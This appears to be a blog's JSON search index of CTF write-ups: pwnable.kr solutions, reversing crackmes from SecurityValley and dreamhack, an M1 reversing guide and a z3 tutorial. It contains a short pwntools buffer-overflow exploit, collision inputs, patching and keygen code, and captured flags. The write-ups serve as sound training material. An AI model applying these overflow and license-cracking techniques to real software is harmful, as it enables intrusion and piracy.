[{"categories":[],"content":"fd echo LETMEWIN | ./fd 4660 ","date":"2023-08-07","objectID":"/toddlers-bottle/:1:0","tags":["pwn"],"title":"[pwnable.kr] Toddlers Bottle","uri":"/toddlers-bottle/"},{"categories":[],"content":"collision piece = hex((0x21DD09EC + pow(2, 32)) // 5)[2:] rev_piece = '' for i in range(len(piece) - 2, -1, -2): rev_piece += piece[i:i+2] print(bytes.fromhex(rev_piece)) ./col \"`python -c \"print('\\xfc\\x01\\xf99' * 5)\"`\" ","date":"2023-08-07","objectID":"/toddlers-bottle/:2:0","tags":["pwn"],"title":"[pwnable.kr] Toddlers Bottle","uri":"/toddlers-bottle/"},{"categories":[],"content":"bof from pwn import * input = b'A' * 0x2C + b'B' * 0x8 + p32(0xCAFEBABE) shell = remote('pwnable.kr', 9000) shell.send(input) shell.interactive() cat flag ","date":"2023-08-07","objectID":"/toddlers-bottle/:3:0","tags":["pwn"],"title":"[pwnable.kr] Toddlers Bottle","uri":"/toddlers-bottle/"},{"categories":[],"content":"flag [This posts is currently being updated…] ","date":"2023-08-07","objectID":"/toddlers-bottle/:4:0","tags":["pwn"],"title":"[pwnable.kr] Toddlers Bottle","uri":"/toddlers-bottle/"},{"categories":[],"content":"Reversing ","date":"2023-08-03","objectID":"/securityvalley-ctf/:1:0","tags":["reversing","coding"],"title":"SecurityValley CTF","uri":"/securityvalley-ctf/"},{"categories":[],"content":"Simple ELF Info Level: 1 Score 5 Category reversing Can you deal with dwarfs and elfs` Link: https://github.com/SecurityValley/PublicCTFChallenges/tree/master/reversing/the_elf That is so easy, just look at printFlag function. Disassemble with Ghidra: ************************************************************** * FUNCTION * ************************************************************** undefined printFlag() undefined AL:1 \u003cRETURN\u003e undefined8 Stack[-0x10]:8 local_10 XREF[2]: 0010117c(W), 00101180(R) printFlag XREF[4]: Entry Point(*), main:001011bf(c), 001020b0, 00102150(*) 00101169 f3 0f 1e fa ENDBR64 0010116d 55 PUSH RBP 0010116e 48 89 e5 MOV RBP,RSP 00101171 48 83 ec 10 SUB RSP,0x10 00101175 48 8d 05 LEA RAX,[s_SecVal{cr4ck1n9_15_E45y}_00102008] = \"SecVal{cr4ck1n9_15_E45y}\" 8c 0e 00 00 0010117c 48 89 45 f8 MOV qword ptr [RBP + local_10],RAX=\u003es_SecVal{cr4ck = \"SecVal{cr4ck1n9_15_E45y}\" 00101180 48 8b 45 f8 MOV RAX,qword ptr [RBP + local_10] 00101184 0f b6 00 MOVZX EAX=\u003es_SecVal{cr4ck1n9_15_E45y}_00102008,byte = \"SecVal{cr4ck1n9_15_E45y}\" 00101187 0f be c0 MOVSX EAX,AL 0010118a 89 c6 MOV ESI,EAX 0010118c 48 8d 05 LEA RAX,[s_%c_Whoops,_that_was_weird??_00102028] = \"%c \\nWhoops, that was weird?? 95 0e 00 00 00101193 48 89 c7 MOV RDI=\u003es_%c_Whoops,_that_was_weird??_00102028,RAX = \"%c \\nWhoops, that was weird?? 00101196 b8 00 00 MOV EAX,0x0 00 00 0010119b e8 d0 fe CALL \u003cEXTERNAL\u003e::printf int printf(char * __format, ...) ff ff 001011a0 90 NOP 001011a1 c9 LEAVE 001011a2 c3 RET Success Flag: SecVal{cr4ck1n9_15_E45y} ","date":"2023-08-03","objectID":"/securityvalley-ctf/:1:1","tags":["reversing","coding"],"title":"SecurityValley CTF","uri":"/securityvalley-ctf/"},{"categories":[],"content":"No statics Info Level: 1 Score 10 Category reversing This time there is no static value inside…but you are the best. So crack it baby! Link: https://github.com/SecurityValley/PublicCTFChallenges/tree/master/reversing/no_static Decompile with Ghidra: undefined8 main(void) { int iVar1; long in_FS_OFFSET; undefined8 local_3a; undefined local_32; char local_31 [9]; undefined8 local_28; undefined8 local_20; undefined8 local_18; long local_10; local_10 = *(long *)(in_FS_OFFSET + 0x28); puts(\"Again, there is something inside me!\"); local_28 = 0x5d84756a5f6c6e5c; local_20 = 0x683e6a60683e3a71; local_18 = 0x865b3c6d7b6a51; local_3a = 0x80717e6f715f8579; local_32 = 0; puts(\"enter your passphrase, please!\"); fgets(local_31,9,stdin); printf(\"try:%s ........ \\n\",local_31); prepare(\u0026local_3a,0xc); printf(\"%s \\n\",\u0026local_3a); iVar1 = strcmp(local_31,(char *)\u0026local_3a); if (iVar1 == 0) { sleep(1); prepare(\u0026local_28,9); printf(\"%s \\n\",\u0026local_28); } else { puts(\"WRONG!\"); } if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) { /* WARNING: Subroutine does not return */ __stack_chk_fail(); } return 0; } From the line 23, we assume that the password will have 8 chars in length. fgets(local_31,9,stdin); From lines 25-26, we see that the local_3a will be generated by prepare function and then be printed. iVar1 = strcmp(local_31,(char *)\u0026local_3a); printf(\"%s \\n\",\u0026local_3a); From lines 27-30, the local_3a will be compared with our password. If two strings are equal the local_28, may be this is the flag we want. So just run this program and get it the flag. (debian-x86_64)parallels@debian-gnu-linux-11:~/Desktop$ ./crackme-02 Again, there is something inside me! enter your passphrase, please! a try:a ........ mySecret WRONG! (debian-x86_64)parallels@debian-gnu-linux-11:~/Desktop$ ./crackme-02 Again, there is something inside me! enter your passphrase, please! mySecret try:mySecret ........ mySecret SecVal{Th15_Wa5_Hard3R} (debian-x86_64)parallels@debian-gnu-linux-11:~/Desktop$ Success Flag: SecVal{Th15_Wa5_Hard3R} ","date":"2023-08-03","objectID":"/securityvalley-ctf/:1:2","tags":["reversing","coding"],"title":"SecurityValley CTF","uri":"/securityvalley-ctf/"},{"categories":[],"content":"The loader Info Level: 3 Score 30 Category reversing I’ve seen that in malware before. There must be something inside Link: https://github.com/SecurityValley/PublicCTFChallenges/tree/master/reversing/the_loader For this problem, it’s easier to solve with dynamic analyst. First let decompile that: int __cdecl __noreturn main(int argc, const char **argv, const char **envp) { const char *Hop; // rax unsigned int v4; // [rsp+Ch] [rbp-14h] BYREF void *v5; // [rsp+10h] [rbp-10h] unsigned __int64 v6; // [rsp+18h] [rbp-8h] v6 = __readfsqword(0x28u); v5 = \u0026unk_2018; v4 = 0; while ( 1 ) { adjustCounter(\u0026v4, argv, envp); Hop = (const char *)getHop(v4); argv = (const char **)v4; printf(\"%d.%s \\n\\nWouldn't it be cool to be able to look into the memory?\\n\\n\", v4, Hop); huuu(v5); ++v4; sleep(1u); } } Look like the problem is in huuu() __int64 __fastcall huuu(__int64 a1) { __int64 str_size; // rax __int64 s_mem; // [rsp+18h] [rbp-8h] s_mem = load_s_mem(a1, 254LL); str_size = get_str_size(s_mem); return unload_mem(s_mem, str_size); } Maybe this function load an unload the flag, so let’s set a breakpoint at the load_s_mem and view the memory. void *__fastcall load_s_mem(const void *a1, char a2) { int i; // [rsp+1Ch] [rbp-14h] unsigned __int64 size; // [rsp+20h] [rbp-10h] void *dest; // [rsp+28h] [rbp-8h] size = get_str_size(a1); dest = malloc(size); memcpy(dest, a1, size); for ( i = 0; size \u003e i; ++i ) *((_BYTE *)dest + i) ^= a2; *((_BYTE *)dest + size) = 0; return dest; // \u003c- set a breakpoint here } [This posts is currently being updated…] ","date":"2023-08-03","objectID":"/securityvalley-ctf/:1:3","tags":["reversing","coding"],"title":"SecurityValley CTF","uri":"/securityvalley-ctf/"},{"categories":[],"content":" Info I’ve have a hard time using Macbook M1 to learn about reversing. Because M1 is ARM chip and I can’t find an easy way to dynamic analyst an ELF file. So today I will share my exprience about reversing on M1. For each program type, I will solve one crackme step by step as an example. ","date":"2023-08-03","objectID":"/how-i-reversing-on-m1/:0:0","tags":["misc","reversing"],"title":"How I reversing on M1","uri":"/how-i-reversing-on-m1/"},{"categories":[],"content":"MacOS ","date":"2023-08-03","objectID":"/how-i-reversing-on-m1/:1:0","tags":["misc","reversing"],"title":"How I reversing on M1","uri":"/how-i-reversing-on-m1/"},{"categories":[],"content":"x86-64 Info Crackme: https://crackmes.one/crackme/60d3982833c5d410b8842fa5 I use zsh and ohmyzsh for main terminal, the reason i use it is because it’s so beautiful. For static analyst, I will use Ghidra. You can install Ghidra through Homebrew. Tip If you like dark theme, you can install it through here: https://github.com/zackelia/ghidra-dark-theme Let’s run Ghidra by ghidraRun command and start analyst this crackme. Decompile at the entry: We can easily see that the program read username and register code, then pass to FUN_100003cb0 to do something. So let’s go to the FUN_100003cb0: The FUN_100003cb0 is not do anything important so just go back and go to FUN_100003b10: The decompile is so terrible so i will go to the end and traceback from the end: From the line 24 to the line 34, we know that FUN_1000039b0 is a print function. line 32 will be executed and print out \"succes!\" only if the password is true. And line 34 will allways be executed and print out \"Nope. Try again :)\". From the line 17 to the line 23, we see that param_1, param_3 look like the string, and param_2 is the lenght. We see that param_1 and param_3 is compared for only first digit. Back to FUN_100003b10, I will remove the lines relative to StackGuard, because it’s doesn’t needed for understanding what the program doing here. Info You can read about StackGuard here: https://www.redhat.com/en/blog/security-technologies-stack-smashing-protection-stackguard I also rewrite the code as pseudo-code to make it more clearly and understanding. Tip You should copy and paste code to the ide like vscode, which can highlight everywhere the varible appear when you select any varible, so it’s easy to rewrite the code. srand(time(NULL)); local_pos = 0; username_pos = rand() % (username_len + 1); if (username_len % 2 == 0) { while (username[username_pos] != '\\0') { local_str[local_pos] = username[username_pos]; local_pos++; username_pos++; } } else if (username_len % 2 != 0) { for (; local_pos \u003c= username_pos; local_pos++) { local_str[local_pos] = username[local_pos]; } } compare(md5(local_str, local_pos), strlen(local_str), register_code); For unknown rand() value, we cant generate register code like this: import hashlib username = input('username: ') username_len = len(username) for split_pos in range(username_len + 1): if username_len % 2 == 0: local_str = username[split_pos:] register_code = hashlib.md5(local_str.encode()).hexdigest().upper() register_code_len = username_len - split_pos else: local_str = username[:split_pos] register_code = hashlib.md5(local_str.encode()).hexdigest().upper() register_code_len = split_pos print(register_code[:register_code_len]) Only one register code in generated codes is valid. The crackme is so bad because the valid register code is generate randomly after our register code is inputed. That cant be happend in reality scenario. So we need to patch this crackme to fix this problem. I will fixed the value local_2c to 0 by patch the line 46 from this: to this (XOR EDX it self to make it equal 0): Info To save the patched, following the tutorial: https://materials.rangeforce.com/tutorial/2020/04/12/Patching-Binaries/ So we can rewrite the resigter code generatation like this: import hashlib username = input('username: ') username_len = len(username) split_pos = 0 if username_len % 2 == 0: local_str = username[split_pos:] register_code = hashlib.md5(local_str.encode()).hexdigest() else: local_str = username[:split_pos + 1] register_code = hashlib.md5(local_str.encode()).hexdigest() print('register_code: ' + register_code[:1]) Okay we will test it: [This posts is currently being updated…] ","date":"2023-08-03","objectID":"/how-i-reversing-on-m1/:1:1","tags":["misc","reversing"],"title":"How I reversing on M1","uri":"/how-i-reversing-on-m1/"},{"categories":[],"content":" Quote z3 seem like magic to me. ","date":"2023-08-02","objectID":"/learning-z3-with-me/:0:0","tags":["reversing","coding"],"title":"Learning z3 with me","uri":"/learning-z3-with-me/"},{"categories":[],"content":"What is z3 Info “Z3 is an efficient Satisfiability Modulo Theories (SMT) solver from Microsoft Research. Z3 is a solver for symbolic logic, a foundation for many software engineering tools. SMT solvers rely on a tight integration of specialized engines of proof. Each engine owns a piece of the global puzzle and implements specialized algorithms.” ","date":"2023-08-02","objectID":"/learning-z3-with-me/:1:0","tags":["reversing","coding"],"title":"Learning z3 with me","uri":"/learning-z3-with-me/"},{"categories":[],"content":"An easy example Suppose I have this crack-me, and you want to crack it. How can you do that? #include \u003cstdio.h\u003e using namespace std; int main() { long long num; printf(\"num = \"); scanf(\"%lld\", \u0026num); int digitSum = 0, len = 0; while (num \u003e 0) { digitSum += num % 10; num /= 10; len++; } if (len == 17 \u0026\u0026 digitSum == 123) { puts(\"Correct!\"); } else { puts(\"Wrong!\"); } } The condition are straightforward, so you can break it through manual condition. However, let’s use this as a starting example. You can solve it using z3, like this: # Import the z3 library from z3 import * # Optimize API provides methods for solving using # objective functions and weighted soft constraints opt = Optimize() # Given the condition from line 17 of the code above we know that `len` = 17 # The list `digits` will store all the num_{i} for i in [0, 17) # where num_{i} represents the i-th digit of `num` digits = [] # Loop through all digits for i in range(17): # Create the lable num_{i} with an integer type num_i = Int(f'num_{i}') # Add conditions for this lable # Each digit will have value in [0, 9] # except the first one, which will have a value in (0, 9] if i == 0: opt.add(num_i \u003e 0) else: opt.add(num_i \u003e= 0) opt.add(num_i \u003c= 9) # Save the lable to the list digits.append(num_i) # Create the label digitSum, which equal the sum of all digits digitSum = Int('digitSum') opt.add(digitSum == sum(digits)) # Add the condition digitSum == 123, as we decuded from the code above opt.add(digitSum == 123) # Check if a model that satisfies the condition is solvable if opt.check() == sat: # Print the answer from the model model = opt.model() print('Answer:', end=' ') print(''.join([chr(model[i].as_long() + ord('0')) for i in digits])) else: # When there is no answer print('No answer!') Upon running the script, you’ll obtain the answer: Answer: 99996999999199800 Testing this with the crack-me: num = 99996999999199800 Correct! ","date":"2023-08-02","objectID":"/learning-z3-with-me/:2:0","tags":["reversing","coding"],"title":"Learning z3 with me","uri":"/learning-z3-with-me/"},{"categories":[],"content":"Apply it to a CTF Task Now let’s solve the collision task on pwnable.kr. I initially solved it through manual calculation, but now let’s have some fun with z3. The problem statement: Info Daddy told me about cool MD5 hash collision today. I wanna do something like that too! ssh col@pwnable.kr -p2222 (pw:guest) Okay let’s connect to the server and retrive the source code: allforest01@Kiese ~ » (base) ssh col@pwnable.kr -p2222 col@pwnable.kr's password: ____ __ __ ____ ____ ____ _ ___ __ _ ____ | \\| |__| || \\ / || \\ | | / _] | |/ ]| \\ | o ) | | || _ || o || o )| | / [_ | ' / | D ) | _/| | | || | || || || |___ | _] | \\ | / | | | ` ' || | || _ || O || || [_ __ | \\| \\ | | \\ / | | || | || || || || || . || . \\ |__| \\_/\\_/ |__|__||__|__||_____||_____||_____||__||__|\\_||__|\\_| - Site admin : daehee87@khu.ac.kr - irc.netgarage.org:6667 / #pwnable.kr - Simply type \"irssi\" command to join IRC now - files under /tmp can be erased anytime. make your directory under /tmp - to use peda, issue `source /usr/share/peda/peda.py` in gdb terminal You have mail. Last login: Wed Aug 2 09:51:46 2023 from 171.225.250.124 col@pwnable:~$ ls col col.c flag col@pwnable:~$ cat col.c #include \u003cstdio.h\u003e #include \u003cstring.h\u003e unsigned long hashcode = 0x21DD09EC; unsigned long check_password(const char* p){ int* ip = (int*)p; int i; int res=0; for(i=0; i\u003c5; i++){ res += ip[i]; } return res; } int main(int argc, char* argv[]){ if(argc\u003c2){ printf(\"usage : %s [passcode]\\n\", argv[0]); return 0; } if(strlen(argv[1]) != 20){ printf(\"passcode length should be 20 bytes\\n\"); return 0; } if(hashcode == check_password( argv[1] )){ system(\"/bin/cat flag\"); return 0; } else printf(\"wrong passcode.\\n\"); return 0; } col@pwnable:~$ _ We will focus on this section of the source code: unsigned long hashcode = 0x21DD09EC; unsigned long check_password(const char* p){ int* ip = (int*)p; int i; int res=0; for(i=0; i\u003c5; i++){ res += ip[i]; } return res; } This function converts char* to int*, requiring us to convert 4-byte chars to int when calculating. And yeah this problem bears resemblance to the one we disscussed earlier. Let’s use z3 to compute the password. from z3 import * # This function converts 4 consecutive bytes to an int def four_char_to_int(arr): # The arr must be 4 bytes in length assert len(arr) == 4 # Just perform a base conversion ret = 0 for i in reversed(range(4)): ret = ret * 256 + arr[i] return ret opt = Optimize() # This list stores the resulting lables result = [] for i in range(20): char_i = Int(f'char_{i}') # Character condition opt.add(char_i \u003e= 0x20) opt.add(char_i \u003c 0x7f) result.append(char_i) # This list stores all the converted numbers numbers = [] for i in range(0, 20, 4): # Convert 4 consecutive bytes to an int number = four_char_to_int(result[i : i + 4]) numbers.append(number) mySum = Int('mySum') # Attention: Integer overflow !!! opt.add(mySum == sum(numbers) % 0x100000000) # Add the task condition opt.add(mySum == 0x21DD09EC) if opt.check() == sat: model = opt.model() print('Password:', end=' ') print(''.join([chr(model[i].as_long()) for i in result])) else: print('No answer!') Upon running this script, you’ll get the password: Password: ex;oYe~q\u003c8[tt{Jp~x}\\ Now, let’s retrive the flag using this password: Tip You will need to replace ;, \u003c, \\ with \\;, \\\u003c, \\\\. col@pwnable:~$ ./col ex\\;oYe~q\\\u003c8[tt{Jp~x}\\\\ daddy! I just managed to create a hash collision :) col@pwnable:~$ _ [This posts is currently being updated…] ","date":"2023-08-02","objectID":"/learning-z3-with-me/:3:0","tags":["reversing","coding"],"title":"Learning z3 with me","uri":"/learning-z3-with-me/"},{"categories":[],"content":" Info From rev-basic-0 to rev-basic-3, it’s been too easy, and I’ve been too lazy to write write-ups… ","date":"2023-07-31","objectID":"/dreamhack-basic-rev/:0:0","tags":["reversing"],"title":"[dreamhack.io] Basic Reversing","uri":"/dreamhack-basic-rev/"},{"categories":[],"content":"rev-basic-4 The challenge isn’t difficult. The only thing you need to be careful with is the uint8_t. #include \u003ciostream\u003e #include \u003cmap\u003e using namespace std; int main() { map\u003cuint8_t, char\u003e memory; for (uint8_t i = 0x20; i \u003c 0x7f; i++) { memory[(i * 16) | (i \u003e\u003e 4)] = char(i); } uint8_t flag[28] = {0x24, 0x27, 0x13, 0xC6, 0xC6, 0x13, 0x16, 0xE6, 0x47, 0xF5, 0x26, 0x96, 0x47, 0x0F5, 0x46, 0x27, 0x13, 0x26, 0x26, 0x0C6, 0x56, 0xF5, 0xC3, 0xC3, 0xF5, 0xE3, 0xE3}; for (int i = 0; i \u003c 28; i++) { cout \u003c\u003c memory[flag[i]]; } cout \u003c\u003c '\\n'; } ","date":"2023-07-31","objectID":"/dreamhack-basic-rev/:1:0","tags":["reversing"],"title":"[dreamhack.io] Basic Reversing","uri":"/dreamhack-basic-rev/"},{"categories":[],"content":"rev-basic-5 At first, I tried a brute-force approach. Howerver, it was quite challenging to see the flag. #include \u003ciostream\u003e #include \u003cmap\u003e using namespace std; int main() { uint8_t flag_enc[23] = {173, 216, 203, 203, 157, 151, 203, 196, 146, 161, 210, 215, 210, 214, 168, 165, 220, 199, 173, 163, 161, 152, 76}; char flag_dec[24]; for (char fi = 0x20; fi \u003c 0x7e; fi++) { flag_dec[0] = fi; for (int i = 1; i \u003c 24; i++) { flag_dec[i] = flag_enc[i - 1] - flag_dec[i - 1]; } for (int i = 0; i \u003c 24; i++) { cout \u003c\u003c flag_dec[i]; } cout \u003c\u003c '\\n'; } cout \u003c\u003c '\\n'; } Later, I saw the flag and reliazed… ?njaj3dg]5lfqau3rj]PSNJ @mk`k2ef^4mer`v2si^OTMK All_l1fe_3nds_w1th_NULL Bkm^m0gd`2oct^x0ug`MVKM� Cjn]n/hca1pbu]y/vfaLWJN� To print only the valid flag, we can use this code snippet: if (flag_dec[23] == 0) { cout \u003c\u003c flag_dec \u003c\u003c '\\n'; } Alternatively, a better approach would be: #include \u003ciostream\u003e using namespace std; int main() { int flag_enc[23] = {173, 216, 203, 203, 157, 151, 203, 196, 146, 161, 210, 215, 210, 214, 168, 165, 220, 199, 173, 163, 161, 152, 76}; int flag_dec[24]; flag_dec[23] = 0; for (int i = 22; i \u003e= 0; i--) { flag_dec[i] = flag_enc[i] - flag_dec[i + 1]; } for (int i = 0; i \u003c 24; i++) { cout \u003c\u003c char(flag_dec[i]); } cout \u003c\u003c '\\n'; } ","date":"2023-07-31","objectID":"/dreamhack-basic-rev/:2:0","tags":["reversing"],"title":"[dreamhack.io] Basic Reversing","uri":"/dreamhack-basic-rev/"},{"categories":[],"content":"rev-basic-6 After disassembling the file, you will easily see that the flag checker part is: __int64 __fastcall sub_140001000(__int64 a1) { int i; // [rsp+0h] [rbp-18h] for ( i = 0; (unsigned __int64)i \u003c 0x12; ++i ) { if ( byte_140003020[*(unsigned __int8 *)(a1 + i)] != byte_140003000[i] ) return 0i64; } return 1i64; } You can take a look at the memory at byte_140003020: 0000000140003020 63 7C 77 7B F2 6B 6F C5 30 01 67 2B FE D7 AB 76 0000000140003030 CA 82 C9 7D FA 59 47 F0 AD D4 A2 AF 9C A4 72 C0 0000000140003040 B7 FD 93 26 36 3F F7 CC 34 A5 E5 F1 71 D8 31 15 0000000140003050 04 C7 23 C3 18 96 05 9A 07 12 80 E2 EB 27 B2 75 0000000140003060 09 83 2C 1A 1B 6E 5A A0 52 3B D6 B3 29 E3 2F 84 0000000140003070 53 D1 00 ED 20 FC B1 5B 6A CB BE 39 4A 4C 58 CF 0000000140003080 D0 EF AA FB 43 4D 33 85 45 F9 02 7F 50 3C 9F A8 0000000140003090 51 A3 40 8F 92 9D 38 F5 BC B6 DA 21 10 FF F3 D2 00000001400030A0 CD 0C 13 EC 5F 97 44 17 C4 A7 7E 3D 64 5D 19 73 00000001400030B0 60 81 4F DC 22 2A 90 88 46 EE B8 14 DE 5E 0B DB 00000001400030C0 E0 32 3A 0A 49 06 24 5C C2 D3 AC 62 91 95 E4 79 00000001400030D0 E7 C8 37 6D 8D D5 4E A9 6C 56 F4 EA 65 7A AE 08 00000001400030E0 BA 78 25 2E 1C A6 B4 C6 E8 DD 74 1F 4B BD 8B 8A 00000001400030F0 70 3E B5 66 48 03 F6 0E 61 35 57 B9 86 C1 1D 9E 0000000140003100 E1 F8 98 11 69 D9 8E 94 9B 1E 87 E9 CE 55 28 DF 0000000140003110 8C A1 89 0D BF E6 42 68 41 99 2D 0F B0 54 BB 16 Now, let’s write the script to decrypt the flag: from pwn import * with open('../bin/chall6.exe', 'rb') as f: file_data = f.read() start_pos = file_data.find(b'\\x63\\x7C\\x77\\x7B\\xF2\\x6B\\x6F\\xC5') table = file_data[start_pos : start_pos + 128] flag = [0x0, 0x4D, 0x51, 0x50, 0x0EF, 0x0FB, 0x0C3, 0x0CF, 0x92, 0x45, 0x4D, 0x0CF, 0x0F5, 0x4, 0x40, 0x50, 0x43, 0x63] reverse = dict() for i in range(128): reverse[table[i]] = i print(''.join([chr(reverse[i]) for i in flag])[:-1]) # [:-1] to remove \\x00 at the end ","date":"2023-07-31","objectID":"/dreamhack-basic-rev/:3:0","tags":["reversing"],"title":"[dreamhack.io] Basic Reversing","uri":"/dreamhack-basic-rev/"},{"categories":[],"content":"rev-basic-7 ","date":"2023-07-31","objectID":"/dreamhack-basic-rev/:4:0","tags":["reversing"],"title":"[dreamhack.io] Basic Reversing","uri":"/dreamhack-basic-rev/"},{"categories":[],"content":"IDA After disassembling with IDA, I noticed a function called __ROL1__() (which seems unfamiliar to me): __int64 __fastcall sub_140001000(__int64 a1) { int i; // [rsp+0h] [rbp-18h] for ( i = 0; (unsigned __int64)i \u003c 31; ++i ) { if ( (i ^ (unsigned __int8)__ROL1__(*(_BYTE *)(a1 + i), i \u0026 7)) != byte_140003000[i] ) return 0i64; } return 1i64; } Open [your_ida_dir]\\plugins\\hexrays_sdk\\include\\defs.h and you will see the implementation and the purpose of this function: // rotate left template\u003cclass T\u003e T __ROL__(T value, int count) { const uint nbits = sizeof(T) * 8; if ( count \u003e 0 ) { count %= nbits; T high = value \u003e\u003e (nbits - count); if ( T(-1) \u003c 0 ) // signed value high \u0026= ~((T(-1) \u003c\u003c count)); value \u003c\u003c= count; value |= high; } else { count = -count % nbits; T low = value \u003c\u003c (nbits - count); value \u003e\u003e= count; value |= low; } return value; } inline uint8 __ROL1__(uint8 value, int count) { return __ROL__((uint8)value, count); } inline uint16 __ROL2__(uint16 value, int count) { return __ROL__((uint16)value, count); } inline uint32 __ROL4__(uint32 value, int count) { return __ROL__((uint32)value, count); } inline uint64 __ROL8__(uint64 value, int count) { return __ROL__((uint64)value, count); } inline uint8 __ROR1__(uint8 value, int count) { return __ROL__((uint8)value, -count); } inline uint16 __ROR2__(uint16 value, int count) { return __ROL__((uint16)value, -count); } inline uint32 __ROR4__(uint32 value, int count) { return __ROL__((uint32)value, -count); } inline uint64 __ROR8__(uint64 value, int count) { return __ROL__((uint64)value, -count); } Note The function __ROL1__() rotates the unsigned __int8 value by count bits to the left. So just use the function __ROR1__() to reverse the flag from byte_140003000: #include \u003ciostream\u003e using namespace std; template\u003cclass T\u003e T __ROL__(T value, int count) { const uint nbits = sizeof(T) * 8; if ( count \u003e 0 ) { count %= nbits; T high = value \u003e\u003e (nbits - count); if ( T(-1) \u003c 0 ) // signed value high \u0026= ~((T(-1) \u003c\u003c count)); value \u003c\u003c= count; value |= high; } else { count = -count % nbits; T low = value \u003c\u003c (nbits - count); value \u003e\u003e= count; value |= low; } return value; } inline uint8_t __ROL1__(uint8_t value, int count) { return __ROL__((uint8_t)value, count); } inline uint8_t __ROR1__(uint8_t value, int count) { return __ROL__((uint8_t)value, -count); } int main() { uint8_t flag[32] = {0x52, 0xDF, 0xB3, 0x60, 0xF1, 0x8B, 0x1C, 0xB5, 0x57, 0xD1, 0x9F, 0x38, 0x4B, 0x29, 0xD9, 0x26, 0x7F, 0xC9, 0xA3, 0xE9, 0x53, 0x18, 0x4F, 0xB8, 0x6A, 0xCB, 0x87, 0x58, 0x5B, 0x39, 0x1E, 0x00}; for (int i = 0; i \u003c 31; i++) { flag[i] = char(__ROR1__(flag[i] ^ i, i \u0026 7)); } cout \u003c\u003c flag \u003c\u003c '\\n'; } ","date":"2023-07-31","objectID":"/dreamhack-basic-rev/:4:1","tags":["reversing"],"title":"[dreamhack.io] Basic Reversing","uri":"/dreamhack-basic-rev/"},{"categories":[],"content":"Ghidra If you disassemble with Ghidra, you will get: undefined8 FUN_140001000(longlong param_1) { byte bVar1; uint local_18; local_18 = 0; while( true ) { if (30 \u003c local_18) { return 1; } bVar1 = (byte)local_18 \u0026 7; if (((byte)(*(byte *)(param_1 + (int)local_18) \u003c\u003c bVar1 | *(byte *)(param_1 + (int)local_18) \u003e\u003e 8 - bVar1) ^ local_18) != (uint)(byte)(\u0026DAT_140003000)[(int)local_18]) break; local_18 = local_18 + 1; } return 0; } Here is my reverse for this: #include \u003ciostream\u003e using namespace std; int main() { uint8_t flag[32] = {0x52, 0xDF, 0xB3, 0x60, 0xF1, 0x8B, 0x1C, 0xB5, 0x57, 0xD1, 0x9F, 0x38, 0x4B, 0x29, 0xD9, 0x26, 0x7F, 0xC9, 0xA3, 0xE9, 0x53, 0x18, 0x4F, 0xB8, 0x6A, 0xCB, 0x87, 0x58, 0x5B, 0x39, 0x1E, 0x00}; for (int i = 0; i \u003c 31; i++) { uint8_t j = i \u0026 7, x = flag[i] ^ i; flag[i] = (x \u003e\u003e j) | (x \u003c\u003c (8 - j)); } cout \u003c\u003c flag \u003c\u003c '\\n'; } ","date":"2023-07-31","objectID":"/dreamhack-basic-rev/:4:2","tags":["reversing"],"title":"[dreamhack.io] Basic Reversing","uri":"/dreamhack-basic-rev/"},{"categories":[],"content":"rev-basic-8 The password checker part: __int64 __fastcall sub_140001000(__int64 a1) { int i; // [rsp+0h] [rbp-18h] for ( i = 0; (unsigned __int64)i \u003c 21; ++i ) { if ( (unsigned __int8)(-5 * *(_BYTE *)(a1 + i)) != byte_140003000[i] ) return 0i64; } return 1i64; } This task is not harder than above: #include \u003ciostream\u003e #include \u003cmap\u003e using namespace std; int main() { uint8_t flag_dec[21] = {0xAC, 0xF3, 0x0C, 0x25, 0xA3, 0x10, 0xB7, 0x25, 0x16, 0xC6, 0xB7, 0xBC, 0x07, 0x25, 0x02, 0xD5, 0xC6, 0x11, 0x07, 0xC5, 0x0C}; map\u003cuint8_t, char\u003e reverse; for (uint8_t i = 0x20; i \u003c 0x7f; i++) { reverse[(-5) * i] = i; } for (uint8_t i = 0; i \u003c 20; i++) { cout \u003c\u003c reverse[flag_dec[i]]; } cout \u003c\u003c '\\n'; } ","date":"2023-07-31","objectID":"/dreamhack-basic-rev/:5:0","tags":["reversing"],"title":"[dreamhack.io] Basic Reversing","uri":"/dreamhack-basic-rev/"},{"categories":[],"content":"rev-basic-9 Get values of byte_140004020: from pwn import * with open('../bin/chall9.exe', 'rb') as f: file_data = f.read() start_pos = file_data.find(b'\\x63\\x7C\\x77\\x7B\\xF2\\x6B\\x6F\\xC5') table = file_data[start_pos : start_pos + 256] for i in table: print(hex(i), end=', ') Reversing the encoded flag: #include \u003ciostream\u003e using namespace std; template\u003cclass T\u003e T __ROL__(T value, int count) { const uint nbits = sizeof(T) * 8; if ( count \u003e 0 ) { count %= nbits; T high = value \u003e\u003e (nbits - count); if ( T(-1) \u003c 0 ) // signed value high \u0026= ~((T(-1) \u003c\u003c count)); value \u003c\u003c= count; value |= high; } else { count = -count % nbits; T low = value \u003c\u003c (nbits - count); value \u003e\u003e= count; value |= low; } return value; } inline uint8_t __ROL1__(uint8_t value, int count) { return __ROL__((uint8_t)value, count); } inline uint8_t __ROR1__(uint8_t value, int count) { return __ROL__((uint8_t)value, -count); } int main() { cin.tie(0)-\u003esync_with_stdio(0); uint8_t flag[25] = {0x7E, 0x7D, 0x9A, 0x8B, 0x25, 0x2D, 0xD5, 0x3D, 0x03, 0x2B, 0x38, 0x98, 0x27, 0x9F, 0x4F, 0xBC, 0x2A, 0x79, 0x00, 0x7D, 0xC4, 0x2A, 0x4F, 0x58, 0x00}; uint8_t byte_140004020[] = {0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x1, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76, 0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0, 0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15, 0x4, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x5, 0x9a, 0x7, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75, 0x9, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84, 0x53, 0xd1, 0x0, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 